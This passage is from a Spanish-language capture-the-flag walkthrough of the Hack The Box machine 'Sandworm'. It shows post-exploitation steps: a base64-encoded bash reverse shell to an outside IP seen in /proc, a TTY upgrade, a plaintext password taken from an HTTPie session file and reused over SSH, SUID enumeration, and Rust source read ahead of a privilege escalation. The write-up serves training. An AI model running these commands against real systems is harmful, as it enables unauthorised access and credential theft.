</code></pre></div><p>Estos son los comandos disponibles:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
atlas@sandworm:/var/www/html/SSA$ ls -la /bin/
ls -la /bin/
total 14304
drwxr-xr-x  2 nobody nogroup     340 Jun 17 19:01 .
drwxr-xr-x 14 nobody nogroup    4096 Jun  6 11:49 ..
-rwxr-xr-x  1 nobody nogroup   35328 Jun 17 19:01 base64
-rwxr-xr-x  1 nobody nogroup   35328 Jun 17 19:01 basename
-rwxr-xr-x  1 nobody nogroup 1396520 Jun 17 19:01 bash
-rwxr-xr-x  1 nobody nogroup   35280 Jun 17 19:01 cat
-rwxr-xr-x  1 nobody nogroup  125688 Jun 17 19:01 dash
-rwxr-xr-x  1 nobody nogroup     948 Jun 17 19:01 flask
-rwxr-xr-x  1 nobody nogroup 4898752 Jun 17 19:01 gpg
-rwxr-xr-x  1 nobody nogroup 1960456 Jun 17 19:01 gpg-agent
-rwxr-xr-x  1 nobody nogroup   35328 Jun 17 19:01 groups
-rwxr-xr-x  1 nobody nogroup   39424 Jun 17 19:01 id
-rwxr-xr-x  1 nobody nogroup    9047 Jun 17 19:01 lesspipe
-rwxr-xr-x  1 nobody nogroup  138208 Jun 17 19:01 ls
lrwxrwxrwx  1 nobody nogroup      19 Jun 17 19:01 python3 -> /usr/bin/python3.10  
-rwxr-xr-x  1 nobody nogroup 5912968 Jun 17 19:01 python3.10
lrwxrwxrwx  1 nobody nogroup      13 Jun 17 19:01 sh -> /usr/bin/dash
</code></pre></div><p>Podemos obtener una TTY completa con <code>python3</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ python3 -c 'import pty; pty.spawn("/bin/bash")'  
&lt;SA$ python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
Could not find command-not-found database. Run 'sudo apt update' to populate it.
reset: command not found
atlas@sandworm:/var/www/html/SSA$ export TERM=xterm
atlas@sandworm:/var/www/html/SSA$ export SHELL=bash
atlas@sandworm:/var/www/html/SSA$ stty rows 50 columns 158
Could not find command-not-found database. Run 'sudo apt update' to populate it.
stty: command not found
</code></pre></div><p>Parece que estamos en un entorno restringido. De hecho, no hay muchos procesos en ejecución:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ ls /proc
1           cmdline        ioports      modules       sys
20          consoles       irq          mounts        sysrq-trigger
3927255     cpuinfo        kallsyms     mpt           sysvipc
3927258     crypto         kcore        mtrr          thread-self
3927259     devices        keys         net           timer_list
3927349     diskstats      key-users    pagetypeinfo  tty
3927350     dma            kmsg         partitions    uptime
3927365     driver         kpagecgroup  pressure      version
43166       dynamic_debug  kpagecount   schedstat     version_signature  
43168       execdomains    kpageflags   scsi          vmallocinfo
acpi        fb             loadavg      self          vmstat
bootconfig  filesystems    locks        slabinfo      zoneinfo
buddyinfo   fs             mdstat       softirqs
bus         interrupts     meminfo      stat
cgroups     iomem          misc         swaps
</code></pre></div><p>Podemos echar un vistazo a los archivos <code>cmdline</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ cat /proc/1/cmdline; echo
/usr/local/bin/firejail--profile=webappflaskrun
atlas@sandworm:/var/www/html/SSA$ cat /proc/20/cmdline; echo
/usr/bin/python3/usr/local/sbin/flaskrun
atlas@sandworm:/var/www/html/SSA$ cat /proc/43166/cmdline; echo
gpg-agent--homedir/home/atlas/.gnupg--use-standard-socket--daemon
atlas@sandworm:/var/www/html/SSA$ cat /proc/43168/cmdline; echo
scdaemon--multi-server
atlas@sandworm:/var/www/html/SSA$ cat /proc/3927255/cmdline; echo
/bin/sh-cecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  
atlas@sandworm:/var/www/html/SSA$ cat /proc/3927258/cmdline; echo
bash
atlas@sandworm:/var/www/html/SSA$ cat /proc/3927259/cmdline; echo
bash-i
atlas@sandworm:/var/www/html/SSA$ cat /proc/3927349/cmdline; echo
python3-cimport pty; pty.spawn("/bin/bash")
atlas@sandworm:/var/www/html/SSA$ cat /proc/3927350/cmdline; echo
/bin/bash
</code></pre></div><p>Parece que el proceso principal está ejecutando:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/usr/local/bin/firejail --profile=webapp flask run  
</code></pre></div><p>Entonces, tenemos una <em>reverse shell</em> de Flask, pero el servidor web se está ejecutando bajo <code>firejail</code>. Por eso tenemos permisos restringidos.</p><h3 id="escapando-de-la-jaula">Escapando de la jaula</h3><p>Tenemos estos archivos en el directorio personal de <code>atlas</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ cd
atlas@sandworm:~$ ls -la
total 44
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .
drwxr-xr-x 4 nobody nogroup 4096 May  4 15:19 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null  
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7 10:30 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .config
drwx------ 4 atlas  atlas   4096 Jun 18 17:11 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6 10:33 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Feb  6 10:34 .ssh
</code></pre></div><p>En <code>.config</code> tenemos esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:~$ ls -la .config
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Jun 17 19:01 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie
atlas@sandworm:~$ ls -la .config/firejail/
ls: cannot open directory '.config/firejail/': Permission denied
atlas@sandworm:~$ ls -la .config/httpie/
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .
drwxrwxr-x 4 atlas  atlas 4096 Jan 15 07:48 ..
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions
atlas@sandworm:~$ ls -la .config/httpie/sessions/
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ..
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 localhost_5000
atlas@sandworm:~$ ls -la .config/httpie/sessions/localhost_5000/
total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ..
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json
atlas@sandworm:~$ cat .config/httpie/sessions/localhost_5000/admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"  
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
</code></pre></div><p>Aquí vemos una contraseña de <code>silentobserver</code> (<code>quietLiketheWind22</code>).Este es válido para acceder a <code>/admin</code> en la página web:</p><p><img src="/images/HTB/Sandworm/Sandworm-16.webp" alt="Sandworm 16"></p><p>Pero podemos reutilizar esta contraseña en SSH y también funciona, porque <code>silentobserver</code> es un usuario de sistema:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:~$ ls /home  
atlas  silentobserver
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> silentobserver@ssa.htb
silentobserver@ssa.htb's password:
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ cat user.txt  
6b30c59a59d5af42131e496ca03817b6
</code></pre></div><h2 id="movimiento-lateral-al-usuario-atlas">Movimiento lateral al usuario <code>atlas</code></h2><p>Podemos ver que hay un binario SUID llamado <code>tipnet</code> y también <code>firejail</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">silentobserver@sandworm:~$ find / -perm -4000 2>/dev/null  
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
</code></pre></div><p>Existe un <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25"><em>exploit</em> para <code>firejail</code></a> cuando es SUID, pero necesitamos convertirnos en <code>atlas</code> ya que necesitamos pertenecer al grupo <code>jailer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -l /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 <span class="code-white code-bg-red">/usr/local/bin/firejail</span>  
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ cat /etc/group | grep jailer
<span class="code-red">jailer</span>:x:1002:atlas
</code></pre></div><p>Tal vez <code>tipnet</code> sea útil para eso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -l /opt/tipnet/target/debug/tipnet
-rwsrwxr-x 2 atlas atlas 58755272 Jun 18 00:00 <span class="code-white code-bg-red">/opt/tipnet/target/debug/tipnet</span>  
</code></pre></div><p>Obsérvese que tenemos permisos de escritura bajo <code>/opt/crates/logger</code>, que es un proyecto de Rust:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt
total 16
drwxr-xr-x  4 root root  4096 Jun 18 17:32 <span class="code-blue">.</span>
drwxr-xr-x 19 root root  4096 Jun  7 13:53 <span class="code-blue">..</span>
drwxr-xr-x  3 root atlas 4096 May  4 17:26 <span class="code-blue">crates</span>
drwxr-xr-x  5 root atlas 4096 Jun  6 11:49 <span class="code-blue">tipnet</span>
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt/crates
total 12
drwxr-xr-x 3 root  atlas          4096 May  4 17:26 <span class="code-blue">.</span>
drwxr-xr-x 4 root  root           4096 Jun 18 17:32 <span class="code-blue">..</span>
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 <span class="code-blue">logger</span>
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt/crates/logger
total 40
drwxr-xr-x 5 atlas silentobserver  4096 May  4 17:08 <span class="code-blue">.</span>
drwxr-xr-x 3 root  atlas           4096 May  4 17:26 <span class="code-blue">..</span>
-rw-r--r-- 1 atlas silentobserver 11644 May  4 17:11 Cargo.lock  
-rw-r--r-- 1 atlas silentobserver   190 May  4 17:08 Cargo.toml
drwxrwxr-x 6 atlas silentobserver  4096 May  4 17:08 <span class="code-blue">.git</span>
-rw-rw-r-- 1 atlas silentobserver    20 May  4 17:08 .gitignore
drwxrwxr-x 2 atlas silentobserver  4096 May  4 17:12 <span class="code-blue">src</span>
drwxrwxr-x 3 atlas silentobserver  4096 May  4 17:08 <span class="code-blue">target</span>
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt/crates/logger/src
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 <span class="code-blue">.</span>
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 <span class="code-blue">..</span>
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
</code></pre></div><p>Esto es <code>lib.rs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">extern</span><span class="mtk1"> </span><span class="mtk5">crate</span><span class="mtk1"> chrono;</span>

<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8 mtku">OpenOptions</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8 mtku">Write</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">chrono</span><span class="mtk5">::</span><span class="mtk8 mtku">prelude</span><span class="mtk5">::*</span><span class="mtk1">;</span>

<span class="mtk5">pub</span><span class="mtk1"> </span><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">log</span><span class="mtk1">(user</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">, query</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">, justification</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> now </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Local</span><span class="mtk5">::</span><span class="mtk8">now</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> timestamp </span><span class="mtk5">=</span><span class="mtk1"> now</span><span class="mtk5">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk4">"%Y-%m-%d %H:%M:%S"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> log_message </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">format!</span><span class="mtk1">(</span><span class="mtk4">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, timestamp, user, query, justification);</span>  

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">match</span><span class="mtk1"> </span><span class="mtk8 mtku">OpenOptions</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/opt/tipnet/access.log"</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Ok</span><span class="mtk1">(file) </span><span class="mtk5">=&gt;</span><span class="mtk1"> file,</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Err</span><span class="mtk1">(e) </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Error opening log file: {}"</span><span class="mtk1">, e);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">    };</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk8 mtku">Err</span><span class="mtk1">(e) </span><span class="mtk5">=</span><span class="mtk1"> file</span><span class="mtk5">.</span><span class="mtk8">write_all</span><span class="mtk1">(log_message</span><span class="mtk5">.</span><span class="mtk8">as_bytes</span><span class="mtk1">()) {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Error writing to log file: {}"</span><span class="mtk1">, e);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Es un proyecto simple que registra mensajes en <code>/opt/tipnet/access.log</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ tail /opt/tipnet/access.log
[2023-06-17 23:40:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.  
[2023-06-17 23:42:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:44:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:46:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:48:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:50:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:52:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:54:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:56:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-06-17 23:58:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
</code></pre></div><p>El otro proyecto es <code>tipnet</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt/tipnet
total 124
drwxr-xr-x 5 root  atlas  4096 Jun  6 11:49 <span class="code-blue">.</span>
drwxr-xr-x 4 root  root   4096 Jun 18 17:34 <span class="code-blue">..</span>
-rw-rw-r-- 1 atlas atlas 41861 Jun 17 23:58 access.log  
-rw-r--r-- 1 root  atlas 46161 May  4 16:38 Cargo.lock
-rw-r--r-- 1 root  atlas   288 May  4 15:50 Cargo.toml
drwxr-xr-- 6 root  atlas  4096 Jun  6 11:49 <span class="code-blue">.git</span>
-rwxr-xr-- 1 root  atlas     8 Feb  8 09:10 <span class="code-green">.gitignore</span>
drwxr-xr-x 2 root  atlas  4096 Jun  6 11:49 <span class="code-blue">src</span>
drwxr-xr-x 3 root  atlas  4096 Jun  6 11:49 <span class="code-blue">target</span>
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /opt/tipnet/src
total 16
drwxr-xr-x 2 root atlas 4096 Jun  6 11:49 <span class="code-blue">.</span>
drwxr-xr-x 5 root atlas 4096 Jun  6 11:49 <span class="code-blue">..</span>
-rwxr-xr-- 1 root atlas 5795 May  4 16:55 <span class="code-green">main.rs</span>
</code></pre></div><p>Esto es <code>main.rs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">extern</span><span class="mtk1"> </span><span class="mtk5">crate</span><span class="mtk1"> logger;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">sha2</span><span class="mtk5">::</span><span class="mtk1">{</span><span class="mtk8 mtku">Digest</span><span class="mtk1">, </span><span class="mtk8 mtku">Sha256</span><span class="mtk1">};</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">chrono</span><span class="mtk5">::</span><span class="mtk8 mtku">prelude</span><span class="mtk5">::*</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::*</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">prelude</span><span class="mtk5">::*</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk1">fs;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">process</span><span class="mtk5">::</span><span class="mtk8 mtku">Command</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk1">io;</span>

<span class="mtk3">// We don't spy on you... much.</span>

<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">Entry</span><span class="mtk1"> {</span>
<span class="mtk1">    timestamp</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1">,</span>
<span class="mtk1">    target</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1">,</span>
<span class="mtk1">    source</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1">,</span>
<span class="mtk1">    data</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1">,</span>
<span class="mtk1">}</span>

<span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span>
<span class="mtk4">             ,,</span>
<span class="mtk4">MMP</span><span class="mtk6">\"\"</span><span class="mtk4">MM</span><span class="mtk6">\"\"</span><span class="mtk4">YMM db          `7MN.   `7MF'         mm</span>
<span class="mtk4">P'   MM   `7               MMN.    M           MM</span>
<span class="mtk4">     MM    `7MM `7MMpdMAo. M YMb   M  .gP</span><span class="mtk6">\"</span><span class="mtk4">Ya mmMMmm</span>
<span class="mtk4">     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM</span>
<span class="mtk4">     MM      MM   MM    M8 M   `MM.M 8M</span><span class="mtk6">\"\"\"\"\"\"</span><span class="mtk4">  MM</span>
<span class="mtk4">     MM      MM   MM   ,AP M     YMM YM.    ,  MM</span>
<span class="mtk4">   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mb</span><span class="mtk4">mo</span>
<span class="mtk4">                  MM</span>
<span class="mtk4">                .JMML.</span>

<span class="mtk4">"</span><span class="mtk1">);</span>


<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> mode </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_mode</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> mode </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> mode </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">"upstream"</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> mode </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">"pull"</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[-] Mode is still being ported to Rust; try again</span><span class="mtk4"> later."</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> conn </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">connect_to_db</span><span class="mtk1">(</span><span class="mtk4">"Upstream"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>


<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> mode </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"pull"</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> source </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/var/www/html/SSA/SSA/submissions"</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">pull_indeces</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> conn, source);</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[+] Pull complete."</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Enter keywords to perform the query:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> keywords </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdin</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">read_line</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> keywords)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> keywords</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[-] No keywords selected.</span><span class="mtk6">\n\n</span><span class="mtk4">[-] Quitting...</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Justification for the search:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> justification </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdin</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">read_line</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> justification)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>

<span class="mtk3">    // Get Username</span>
